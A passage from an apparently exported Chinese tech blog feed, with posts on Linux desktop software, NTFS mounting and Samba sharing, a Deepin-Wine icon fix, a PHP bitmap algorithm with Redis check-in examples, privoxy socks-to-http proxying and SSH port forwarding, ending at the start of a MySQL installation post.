<h2 id="二、日常生活篇"><a href="#二、日常生活篇" class="headerlink" title="二、日常生活篇"></a>二、日常生活篇</h2><h3 id="1-浏览器"><a href="#1-浏览器" class="headerlink" title="1.浏览器"></a>1.浏览器</h3><p>首推 Google Chrome、其次Firefox，不解释，一定要注册/登录Google账号哦。</p>
<h3 id="2-聊天"><a href="#2-聊天" class="headerlink" title="2.聊天"></a>2.聊天</h3><p>QQ是个Bug，网上有wine版本，功能很残缺，建议大家不要折腾了，实在需要就用Windows虚拟机吧！而微信则可以登录网页版，发送图片文件都没问题。</p>
<p>这里更正一下，QQ有一个wine版本非常不错，功能堪称完美，据说是提取自国产深度Linux系统，其本质上是用了一个收费的wine工具crossover。微信也有客户端版本，是一个第三方的开源项目，名字叫electronic，可以去github看看。—2017-10-14</p>
<h3 id="3-虚拟机"><a href="#3-虚拟机" class="headerlink" title="3.虚拟机"></a>3.虚拟机</h3><p>VMware 和 Virtualbox, 一个收费，一个开源免费，功能上来说基本差不多，虚拟一个Windows系统有时候还是有点用的。</p>
<h3 id="4-下载"><a href="#4-下载" class="headerlink" title="4.下载"></a>4.下载</h3><p>Linux下的BT客户端其实很多，比如Transmission、qBitTorrent。。。然而国内这网络状况，基本上下载不动，还是迅雷好使点，我一般是在虚拟机里面用迅雷下载。</p>
<h3 id="5-同步网盘"><a href="#5-同步网盘" class="headerlink" title="5.同步网盘"></a>5.同步网盘</h3><p>国内有个叫坚果云Nutstore挺好使，每月有免费流量，同步一些小文件没问题，文件多了就要花钱买流量了。</p>
<h3 id="6-音乐"><a href="#6-音乐" class="headerlink" title="6.音乐"></a>6.音乐</h3><p>网易云音乐，不解释。</p>
<h3 id="7-视频"><a href="#7-视频" class="headerlink" title="7.视频"></a>7.视频</h3><p>除了系统自带的播放器，我一般用vlc播放器，感觉效果好点。</p>
<h3 id="8-文档"><a href="#8-文档" class="headerlink" title="8.文档"></a>8.文档</h3><p>WPS当之无愧，而且还没广告，良心之作，卸载掉自带的LibreOffice吧。</p>
<h3 id="9-输入法"><a href="#9-输入法" class="headerlink" title="9.输入法"></a>9.输入法</h3><p>搜狗输入法也算是良心之作，没广告，自动更新词库，还能换皮肤，不过偶尔会出问题，删除用户配置文件就能解决。</p>
<h3 id="10-截图"><a href="#10-截图" class="headerlink" title="10.截图"></a>10.截图</h3><p>系统自带截图，PrtSc键全屏截图，shift+PrtSc局部截图，也可以安装一个第三方截图软件Shutter。</p>
<p>使用Linux系统至今，未发现有什么没法解决的问题，Windows能干的事情，Linux也能干，实在干不了的事情虚拟机干，随着Qt的流行，以后跨平台的软件应该会越来越多，相信Linux系统也会变的越来越流行！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下挂载NTFS硬盘和Samba共享</title>
    <url>/2018/linux/linux-ntfs-samba.html</url>
    <content><![CDATA[<h3 id="1-挂载-NTFS-硬盘"><a href="#1-挂载-NTFS-硬盘" class="headerlink" title="1.挂载 NTFS 硬盘"></a>1.挂载 NTFS 硬盘</h3><p>讲道理是不建议在Linux下面使用ntfs这种文件系统，Linux有个专用的文件系统ext4，但是为什么这么用呢？主要原因还是为了兼容Windows，ntfs是Windows最常用的文件系统。</p>
<p>还有一种情况是双系统，为了能在Linux和Windows下面都能读取到，只能使用ntfs格式，毕竟Linux对ntfs格式还算是挺友好的，但是Windows对ext4貌似不是那么友好，虽然也有软件能读取，但是麻烦!</p>
<a id="more"></a>

<p>默认情况下，主流Linux发行版是支持ntfs格式的分区的，如果不支持的话需要安装一个软件就行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ntfs-3g</span><br></pre></td></tr></table></figure>
<p>然后你在文件管理的右边就会看到可以挂载的分区，其实这时候还没有挂载，鼠标点一下会自动挂载，下面里面的Data和Video分区就是我挂载好的：</p>
<img src = "/images/old/5f6e3e27ly1fvyhm4x86mj20580bgaa7.jpg" />

<p>如果你用的不是桌面发行版，可以使用 mount 命令挂载</p>
<p>问题来了，为了方便，需要实现每次开机自动挂载，这需要修改一个配置，Linux的磁盘挂载配置在 /etc/fstab 文件，你可以手动编写这个配置，这里给一个示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"></span><br><span class="line">#Entry for &#x2F;dev&#x2F;nvme0n1p5 :</span><br><span class="line">UUID&#x3D;ccaace56-1c45-487c-ac0b-b337c37c107f	&#x2F;	ext4	errors&#x3D;remount-ro	0	1</span><br><span class="line">#Entry for &#x2F;dev&#x2F;nvme0n1p1 :</span><br><span class="line">UUID&#x3D;257D-EDE3	&#x2F;boot&#x2F;efi	vfat	defaults	0	1</span><br><span class="line">#Entry for &#x2F;dev&#x2F;sda1 :</span><br><span class="line">UUID&#x3D;5C5AAFB95AAF8E78	&#x2F;media&#x2F;jwang&#x2F;Data	ntfs-3g	defaults,nodev,nosuid,locale&#x3D;en_US.UTF-8	0	0</span><br><span class="line">#Entry for &#x2F;dev&#x2F;sda2 :</span><br><span class="line">UUID&#x3D;4274B7A774B79C5B	&#x2F;media&#x2F;jwang&#x2F;Video	ntfs-3g	defaults,nodev,nosuid,locale&#x3D;en_US.UTF-8	0	0</span><br><span class="line">#Entry for &#x2F;dev&#x2F;nvme0n1p2 :</span><br><span class="line">UUID&#x3D;13b7dfee-a639-464f-b2f5-c7b2e435b71d	none	swap	sw	0	0</span><br><span class="line"></span><br><span class="line">#UUID&#x3D;94A4-85E8	&#x2F;boot&#x2F;efi	vfat	umask&#x3D;0077	0	1</span><br></pre></td></tr></table></figure>
<p>需要注意的是，这里面有些分区是安装系统的时候自动挂载上去的。这里说一个小bug，如果你这个配置文件不对，每次开机的时候就会卡很久，大概30s左右。</p>
<p>因为这个配置文件是在开机的时候自动执行的，如果系统找不到你配置的磁盘或者挂载点，就会一直等，最后超时就会跳过。</p>
<p>所以如果你哪天发现你开机的时候很慢,不妨看看这个文件。</p>
<p>不过呢，手动配置还是比较麻烦，这里建议大家使用一个软件去配置挂载ntfs分区，名字叫 ntfs-config：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ntfs-config</span><br><span class="line">sudo ntfs-config</span><br></pre></td></tr></table></figure>
<p>会弹出一个图形界面，配置一下即可，简单方便，如果不是桌面版的话，你需要好好研究研究这个fstab文件的了，其实也不难，看看官方文档就可以了,这里不细说了！</p>
<h3 id="2-Samba共享"><a href="#2-Samba共享" class="headerlink" title="2.Samba共享"></a>2.Samba共享</h3><p>这个其实挺实用的，很多路由器，nas都是用的这个共享文件，简单的说SMB是一种文件共享协议，Samba这个软件实现了这种协议，厉害的地方就在于SMB这个协议被Windows，Mac，Android等很多操作系统都支持。</p>
<p>你可以很方便的把你电脑上的文件通过网络(一般都是局域网)共享给别人。举个例子，在公司共享文件给同事，在家里可以共享一下电脑上的电影，照片啊，手机上装一个文件浏览器也可以。</p>
<p>个人经常用到的是把电脑下载好的电影共享出来，Android手机上安装一个叫作ES文件浏览器的App就可以直接“在线”看电影了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install samba</span><br></pre></td></tr></table></figure>
<p>打开一个文件夹的属性你就会看到共享的选项，可以选择只读或者读写，也可以设置访问账号和密码，如果只是自己用，全部都勾上就行了！</p>
<img src = "/images/old/5f6e3e27ly1fvyhy77p2qj20ek0f9q3x.jpg" />

<p>就是这么简单，但是如果你不是用的桌面版Linux，那也没问题，Samba的配置文件位于 /etc/samba/smb.conf, 自己加一个配置就行，配置文件示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[profiles]</span><br><span class="line">    comment &#x3D; Users profiles</span><br><span class="line">    path &#x3D; &#x2F;home&#x2F;samba&#x2F;profiles</span><br><span class="line">    guest ok &#x3D; no</span><br><span class="line">    browseable &#x3D; no</span><br><span class="line">    create mask &#x3D; 0600</span><br><span class="line">    directory mask &#x3D; 0700</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里说一个疑难杂症，有可能有人遇到过，就是挂载的ntfs分区使用Samba共享的时候可能会出现共享权限问题，就是对方可以看到共享的文件夹，但是点击文件夹提示没有权限。<br>排除了文件夹权限之后，我最后找到一个解决方案，就是在Samba的配置文件里面加入一个配置: force user = your-user-name</p>
</blockquote>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Deepin-Wine-QQ或微信图标Bug</title>
    <url>/2018/linux/deepin-wine-qq-bug.html</url>
    <content><![CDATA[<p>之前写过一篇文章说在Linux下面使用deepin的wine QQ和微信, 虽然这个版本挺好用，但是一直以来有个bug困扰我：QQ和微信的图标都是wine的小图标，一模一样不说，还重叠在一起，当你使用 <strong>ctrl+tab</strong> 切换应用的时候很头疼，用过的人应该生有感受！</p>
<img src="/images/old/3571187-9b36a691ddfe0a8b.jpg" />

<a id="more"></a>

<p>有段时间我网上查了很久都没有找到答案，起初以为是图标问题！在Linux下面桌面图标快捷方式是由一个desktop文件配置，比如微信的内容基本上如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env xdg-open</span></span><br><span class="line"></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Type=Application</span><br><span class="line">X-Created-By=Deepin WINE Team</span><br><span class="line">Categories=chat;</span><br><span class="line">Icon=deepin.com.wechat</span><br><span class="line">Exec=<span class="string">"/opt/deepinwine/apps/Deepin-WeChat/run.sh"</span> -u %u</span><br><span class="line">Name=WeChat</span><br><span class="line">Name[zh_CN]=微信</span><br><span class="line">Comment=Tencent WeChat Client on Deepin Wine</span><br><span class="line">StartupWMClass=WeChat.exe</span><br><span class="line">MimeType=</span><br></pre></td></tr></table></figure>
<p>其中有几个比较关键的地方，一个是Icon，一个是Exec，还有Name，有一天我看到这个 <strong>StartupWMClass</strong> 突发奇想，虽然我不懂是啥意思，但是感觉这个有问题。</p>
<p>于是百度了一下，基本上找不到任何内容，只有一篇文章，点进去居然是404…还好有百度快照！</p>
<img src="/images/old/3571187-65b3cf68d42da7b5.jpg" />

<p>终于找到问题所在了，默认情况下，Linux是根据可执行文件的名称判定是属于哪个desktop文件配置的，大部分desktop文件的Exec配置的可执行文件刚好就是实际执行的文件名，所以很多没有StartupWMClass配置项。</p>
<p>但是这个配置项很重要，比如说在上面的微信的配置里面这个值是”WeChat.exe“，但是为什么还是不行呢？</p>
<p>根据文章的说法，可以通过<code>xprop WM_CLASS</code>获取窗口的属性值，在命令行下执行这个命令，鼠标会变成+，然后点击要QQ或微信的窗口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ xprop WM_CLASS</span><br><span class="line">WM_CLASS(STRING) = <span class="string">"wechat.exe"</span>, <span class="string">"Wine"</span></span><br></pre></td></tr></table></figure>
<p>不知道这个值是不是不同的电脑不一样，反正在我的电脑上面这个值是”wechat.exe“，居然是小写！</p>
<p>这样的话，我们只需把desktop配置文件里面的StartupWMClass改成小写的就行了，问题解决！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Deepin-Wine</tag>
      </tags>
  </entry>
  <entry>
    <title>Bitmap原理和应用</title>
    <url>/2018/coding/bitmap.html</url>
    <content><![CDATA[<blockquote>
<p>问: “有10亿个不重复的无序的数字，如果快速排序？”</p>
</blockquote>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>面试中经常会问到类似问题，看上去很简单，就是一个排序而已，但是你好好想想大部分排序算法都需要把数据放到内存里面操作，这10亿个数字得占用多少内存？好吧，你可以使用外部排序算法，在磁盘上完成排序！当然这些传统算法肯定是可以解决的，不过这里有一个更好的方案，采用bitmap排序，介绍如下：</p>
<p>bitmap是什么？ 大家都知道在计算机中一个字节(byte) = 8位(bit), 这里的bit就是位，数据的最小表示单位，map一般是表示地图或者映射，加一起叫作位图？貌似不太形象</p>
<a id="more"></a>

<p>简单回顾一下二进制的一些知识：</p>
<p>1byte = 8bit</p>
<p>一个bit有2种状态，0 或者 1</p>
<p>所以1个byte可以表示0000 0000 -&gt; 1111 1111, 也就是十进制的 0 到 255</p>
<p>其中十进制和二进制对应关系如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0 ---------&gt; 0000 0000</span><br><span class="line"> 1 ---------&gt; 0000 0001</span><br><span class="line"> 2 ---------&gt; 0000 0010</span><br><span class="line"> 3 ---------&gt; 0000 0011</span><br><span class="line"> 4 ---------&gt; 0000 0100</span><br><span class="line"> 5 ---------&gt; 0000 0101</span><br><span class="line"> 6 ---------&gt; 0000 0110</span><br><span class="line"> 7 ---------&gt; 0000 0111</span><br><span class="line"> 8 ---------&gt; 0000 1000</span><br><span class="line"> 9 ---------&gt; 0000 1001</span><br><span class="line">10 ---------&gt; 0000 1010</span><br><span class="line">11 ---------&gt; 0000 1011</span><br><span class="line">12 ---------&gt; 0000 1100</span><br><span class="line">13 ---------&gt; 0000 1101</span><br><span class="line">14 ---------&gt; 0000 1110</span><br><span class="line">15 ---------&gt; 0000 1111</span><br><span class="line">.......................</span><br><span class="line">.......................</span><br><span class="line">255...........1111 1111</span><br></pre></td></tr></table></figure>

<p>在大部分编程语言里面，int类型一般的都是占4个byte，也是32位，甭管你这个数字是1 或者是 21亿你都得占32位，所以如果你现在有10亿数字需要存放在内存里面，需要多少内存呢？</p>
<p>1000000000 * 4 / 1024 / 1024 = 3800MB，大概需要3800MB内存，这里计算出的数值只适合C，在PHP里面，一个整型变量占用的实际空间远远大于4byte，是好几倍！</p>
<p>为了解决这个问题，bitmap采用了一种映射机制，举个例子，假如有 1，3, 7，2, 5 这5个数字需要存放，正常情况下你需要5*4=20byte，但bitmap只需要1byte，它是咋做到呢？</p>
<p>假设下面是1byte，首先将所有位置为0：</p>
<p>0 0 0 0 0 0 0 </p>
<p>从第一个0开始数数，把对应数字的位置置为1，比如说第一个1那就是第2个位置置为1，第二个3就是把第4个位置置为1，依此论推…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &#x3D;&gt; 0 1 0 0 0 0 0 0</span><br><span class="line">3 &#x3D;&gt; 0 0 0 1 0 0 0 0</span><br><span class="line">7 &#x3D;&gt; 0 0 0 0 0 0 0 1</span><br><span class="line">2 &#x3D;&gt; 0 0 1 0 0 0 0 0</span><br><span class="line">5 &#x3D;&gt; 0 0 0 0 0 1 0 0</span><br></pre></td></tr></table></figure>
<p>叠加起来最终的串就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 1 1 1 0 1 0 1</span><br></pre></td></tr></table></figure>
<p>其实最终的数字和二进制没有什么关系，纯粹是数数，这个串就可以代表最大到7的数字，然后我们就开始数数，从0开始：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">比如第1个位置是1，那就记个1</span><br><span class="line">比如第2个位置是1，那就记个2</span><br><span class="line">比如第3个位置是1，那就记个3</span><br><span class="line">比如第5个位置是1，那就记个5</span><br><span class="line">比如第7个位置是1，那就记个7</span><br></pre></td></tr></table></figure>

<p>结果就是 1 2 3 5 7，不仅仅排序了，而且还去重了！如果按照这种转换机制，1个int类型，32位的话，可以表示0-31之间的数字！</p>
<p>如果你们要表示最大1万的数，那就需要1万个位的串，但是编程语言并没有这样的数据类型，但是可以用数组去模拟</p>
<p>举个例子：一个整型是32位，也就说我们大概需要314个数组元素来表示这个串</p>
<p>数组第1个元素 00 - 31</p>
<p>数组第2个元素 32 - 63</p>
<p>数组第3个元素 64 - 95</p>
<p>数组第4个元素 96 - 127</p>
<p>…<br>…</p>
<p>提到这个算法的好处，最大的好处就是节省内存，节省了好几十倍，适合处理大量数据，除了快速排序，还可以做快速去重，快速查询是否存在，还有一个比较好听的应用 Bloom Filter(布隆过滤器):</p>
<blockquote>
<p>Bloom Filter使用k个相互独立的哈希函数（Hash Function），它们分别将集合中的每个元素映射到{1,…,m}的范围中。对任意一个元素x，第i个哈希函数映射的位置hi(x)就会被置为1（1≤i≤k）。注：如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果。<br>Bloom Filter 在判断y是否属于这个集合时，对y应用k次哈希函数，若所有hi(y)的位置都是1（1≤i≤k），就认为y是集合中的元素，否则就认为y不是集合中的元素。</p>
</blockquote>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>下面是这个算法的一些演示代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\bitmap;</span><br><span class="line"></span><br><span class="line">class Bitmap</span><br><span class="line">&#123;</span><br><span class="line">    const MAX    &#x3D; 10000;</span><br><span class="line">    const SHIFT  &#x3D; 5;</span><br><span class="line">    const MASK   &#x3D; 0x1F;</span><br><span class="line">    const DIGITS &#x3D; 32;</span><br><span class="line"></span><br><span class="line">    private $bits &#x3D; [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $len &#x3D; 1 + self::MAX &#x2F; self::DIGITS;</span><br><span class="line">        for ($i &#x3D; 0; $i &lt; $len; $i++) &#123;</span><br><span class="line">            $this-&gt;bits[$i] &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function set(int $n)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;bits[$n &gt;&gt; self::SHIFT] |&#x3D; (1 &lt;&lt; ($n &amp; self::MASK));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function clear(int $n)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;bits[$n &gt;&gt; self::SHIFT] &amp;&#x3D; (~(1 &lt;&lt; ($n &amp; self::MASK)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function test(int $n)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;bits[$n &gt;&gt; self::SHIFT] &amp; (1 &lt;&lt; ($n &amp; self::MASK));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$bitmap &#x3D; new Bitmap();</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; Bitmap::MAX; $i++) &#123;</span><br><span class="line">    $bitmap-&gt;clear($i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exampleData &#x3D; [1, 23, 34, 5454, 677, 834, 123, 355, 6784, 2345, 98, 9782, 432, 2342, 872, 732, 2334];</span><br><span class="line">foreach ($exampleData as $item) &#123;</span><br><span class="line">    $bitmap-&gt;set($item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 1; $i &lt;&#x3D; Bitmap::MAX; $i++) &#123;</span><br><span class="line">    if ($bitmap-&gt;test($i)) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, $i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于这里面涉及很多位运算操作，所以先回顾一下位操作：</p>
<img src = "/images/old/5f6e3e27ly1fwsu2sa2rkj20rt09vac1.jpg" />

<p>此算法的实现是参考一个C语言版本的，简单解析一下：</p>
<p>第一步，是初始化一个数组，这个数组的长度是根据最大的元素的值来的，比如说你要存一个最大10000的数，由于每个元素最多32位，所以需要大概314个数组。</p>
<p>第二步，初始化数组中的每个元素，把每个位都置成0，在PHP里面其实不需要，但是C里面是必须的，使用了clear这个函数。</p>
<p>SHIFT 是表示位移的位数，之所以是5是因为2的5次方是32，简单的说 <code>$n &gt;&gt; self::SHIFT</code> 这个操作是为了找到当前元素在哪个数组！</p>
<p>MASK 是表示掩码，0x1F是 十进制的31，<code>1 &lt;&lt; ($n &amp; self::MASK)</code> 这个操作是计算出当前元素在对应数组里面位置！</p>
<p>举个例子，当前元素是100，按照算法，是在第3个数组里面，下标为4的位置，大家仔细推敲一下，结果确实是这样！只不过这里运用了不少位操作，所以理解起来可能会麻烦一点。</p>
<h3 id="REDIS-bitmap相关应用"><a href="#REDIS-bitmap相关应用" class="headerlink" title="REDIS bitmap相关应用"></a>REDIS bitmap相关应用</h3><p>自己造轮子太累，redis提供了类似的命令，最大可以存放2的32次方，即21亿多的数字，主要有以下几个：SETBIT， GETBIT， BITCOUNT， BITOP， BITPOS，BITFIELD，</p>
<p>主要用来做活跃用户在线状态、活跃用户统计、用户签到等场景，特别适合大量用户，几千万上亿级别，当然你用传统数据库也能做，但是redis做起来更简单，更节省空间！</p>
<p>下面举一个用户签到的功能设计案例：</p>
<p>很多App都有一个签到功能，比如说连续签到7天或者30天给一些奖励，需求十分简单！</p>
<p>作为后端，我们需要提供一个签到接口，然后记录用户签到的信息，比如用户uid，签到时间！</p>
<p>如果使用传统关系型数据库，我们可能需要建一张签到表，大概有id、uid、createdTime等几个字段，当用户签到的时候新增一条记录就行！这种做法肯定是没问题的，但是如果网站每天有千万用户签到，那么这张表每天都会有千万条记录产生，数据的存储是问题！分库分表必不可少！</p>
<p>假如使用redis的bit操作，我们可以使用setbit，<code>SETBIT key offset value</code> 对指定的key的value的指定偏移(offset)的位置1或0, 其中key我们可以设置为当天的年月日，offset是用户uid（这里暂时只考虑uid是纯数字的情况）,value的话1表示已签到。比如说用户uid位12500的用户在20190501签到了，我们可以执行<code>SETBIT 20190501 12500 1</code>,其它用户依此论推！</p>
<p>如果我们需要查询用户某天是否签到，只需要使用<code>GETBIT 20190501 12500</code>，返回1表示已签到，0未签到。</p>
<p>如果需要查询某天有多少人签到，可以使用<code>BITCOUNT 20190501</code>。</p>
<p>如果要统计连续7天签到的总人数的话可以使用bitop命令，比如<code>bitop AND 7_dasy_sign 20190501 20190502 20190503 ... 20190507</code>。</p>
<p>理论上讲，setbit的大小在0到2的32次方（最大使用512M内存）之间，即0~4294967296之间，也就说最多可以存储42亿用户的签到情况。和数据库相比，这种方式查询的效率非常高，并不会因为数据大而变慢，而且比较节省内存，操作上也不是太复杂！</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>Bitmap</tag>
      </tags>
  </entry>
  <entry>
    <title>科学上网之socks代理转http(s)</title>
    <url>/2018/linux/socks-to-http.html</url>
    <content><![CDATA[<p>从事IT开发行业的总免不了用用Google，看看国外互联网，但是呢有道墙大家都懂的，其中有一种socks5的梯子，一般都是配置浏览器，如何在命令行下也使用呢？有过使用经验的都知道，Linux终端是不走socks代理配置的，除此之外，很多软件或者应用也不支持socks代理设置，但是有一个软件是可以把socks代理转为http代理，这个软件就叫做privoxy，下面简单介绍下这个软件使用：</p>
<a id="more"></a>

<p>1.开启某SS代理，代理地址假设为 127.0.0.1:1080</p>
<p>2.安装privoxy，这里只介绍debian系列发行版，其他系统不多说，其实都差不多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install privoxy</span><br></pre></td></tr></table></figure>

<p>3.修改privoxy配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;privoxy&#x2F;config</span><br></pre></td></tr></table></figure>

<p>在里面添加一条：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forward-socks5   &#x2F;               127.0.0.1:1080 .</span><br></pre></td></tr></table></figure>
<p>请注意后面有一个 .</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下面还存在以下一条配置，表示privoxy监听本机8118端口</span><br><span class="line"># 把它作为http代理，代理地址为 http:&#x2F;&#x2F;localhost.8118&#x2F; </span><br><span class="line"># 可以把地址改为 0.0.0.0:8118，表示外网也可以通过本机IP作http代理</span><br><span class="line"># 这样，你的外网IP为1.2.3.4，别人就可以设置 http:&#x2F;&#x2F;1.2.3.4:8118&#x2F; 为http代理</span><br><span class="line"></span><br><span class="line">listen-address localhost:8118</span><br></pre></td></tr></table></figure>
<p>4.重启privoxy服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service prioxy restart</span><br></pre></td></tr></table></figure>

<p>5.配置命令行或者应用</p>
<p>如果是软件，直接在软件代理设置填写http(s)地址为 127.0.0.1:8118 即可</p>
<p>如果是Linux命令行可以使用export命令临时设置代理，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8118&#x2F;</span><br><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8118&#x2F;</span><br></pre></td></tr></table></figure>
<p>如果需要永久设置代理，可以修改环境配置文件，把上面的命令写到.bashrc文件里面就行了，但是不建议这么做，这样所有流量都会走代理，会影响访问国内网站的速度，建议需要的时候临时配置即可，毕竟这样的场景并不多！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Socks</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透之SSH端口转发</title>
    <url>/2018/linux/ssh-port-redirect.html</url>
    <content><![CDATA[<h3 id="1-场景需求："><a href="#1-场景需求：" class="headerlink" title="1.场景需求："></a>1.场景需求：</h3><p>有些公司喜欢把svn或者git，或者是内部测试服务器放在公司，一般来说，由于NAT的原因，这种访问是单向的，举个例子，我们可以访问百度的服务器，但是百度服务器是没法访问我们电脑的。</p>
<p>由于只能通过公司内网访问，员工回家之后就无法访问了，安全是安全了，但是万一有个需求需要从公司外部访问呢？</p>
<p>对路由器比较熟悉的童鞋会说：“在路由器上作端口映射转发即可”。这个方案确实可以，但是有2个问题，首先，你得能控制路由器并且可以在上面做设置。其次，一般公司的宽带都没有固定ip，这意味着这个公网ip每隔10-20小时就会变动…</p>
<a id="more"></a>

<h3 id="2-场景假设："><a href="#2-场景假设：" class="headerlink" title="2.场景假设："></a>2.场景假设：</h3><ol>
<li><p>公司内部有一台服务器1，ip地址为: 192.168.1.125，只有公司内部同一网段的设备才能访问</p>
</li>
<li><p>公司外面有一台公网ip的服务器2，ip地址为: 45.32.127.32，所有人都可以访问</p>
</li>
</ol>
<p>假如我们需要公司外部的人也能访问服务器1需要怎么做呢？解决方案就是采用SSH端口转发，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -fNR 8000:localhost:80 root@45.32.127.32</span><br></pre></td></tr></table></figure>
<p>还有一点非常重要，你需要在45.32.127.32这台服务器开启ssh一个配置（linux系统里面一般是在/etc/ssh/sshd_config文件）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>

<p>这段命令的意思是把对服务器2的8000端口请求转发到服务器1的80端口，这样我们访问 <code>http://45.32.127.32:8000</code> 就相当于访问 <code>http://192.168.1.125:80</code></p>
<p>当然你还可以转发其他端口，比如常见的3306, 22, 21等端口。</p>
<h3 id="3-总结："><a href="#3-总结：" class="headerlink" title="3.总结："></a>3.总结：</h3><p>上面所说的这种方式又被称为SSH端口远程转发,具体的命令细节这里不作过多解读，与之对应的还有一种方式称为本地转发,其命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -fNL 8000:45.32.127.32:80 root@192.168.1.125</span><br></pre></td></tr></table></figure>
<p>这段命令的意思是把对本地8000端口的请求转发到45.32.127.32的80端口上面去，这时候访问 <code>http://127.0.0.1:8000</code> 就相当于访问 <code>http://45.32.127.32:80</code>。</p>
<p>举个例子，你们公司有2台服务器，它们之间可以互联，其中有一台服务器可以上网，但是另一台呢被防火墙挡着了，这时候通过这个命令就可以“翻墙”了。</p>
<p>还有一种方式叫作动态转发，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -D 50000 root@45.32.127.32。</span><br></pre></td></tr></table></figure>
<p>这种方式其实就是相当于socks代理，他会把本地的所有请求都转发到远程服务器上面，很实用哦，假如说你的那台服务器是在国外的话，你懂的！</p>
<p>最后，有一点需要说明的是，所有的流量都会走中间服务器过，这种端口转发其实就是一种代理，类似于VPN。</p>
<p>其实利用SSH转发我们可以把放在家里的服务器开放给朋友，不过家庭宽带上传速度有限，不拿来商用还是可以滴，商用还是买个正规云服务器靠谱！<br>还有，这种方式一般都是临时用一下，如果想长期使用，可以尝试一下frp等类似的软件！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql主从复制实践</title>
    <url>/2018/coding/mysql-master-slave-copy.html</url>
    <content><![CDATA[<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><p>很多人都知道可以用apt或者yum安装，但是实际生产环境很少采用这种方式安装，有些会采用源码编译(据说性能高？)，有些会从官网下载编译好的二进制安装包！</p>
<p>为什么不直接用命令安装呢？因为命令安装的位置不同发行版不一样，而且其配置文件存放的位置又各有差异，现实中大部分公司都有一个约定的规则，比如说所有的安装都安装在 <strong>/data</strong> 目录下，如果需要开机自启，需自行编写脚本，不依赖系统服务。</p>
<p>还有一个重要的原因是因为很多时候数据库是安装在单独的数据库服务器，但是一台电脑比如说32核64G内存这样的配置，是需要安装多个Mysql实例的，用不同的端口区分，这些库可能是不同的项目所用到。</p>
<a id="more"></a>

<p>下面我就介绍如何使用编译好的二进制安装包安装MySQL:</p>
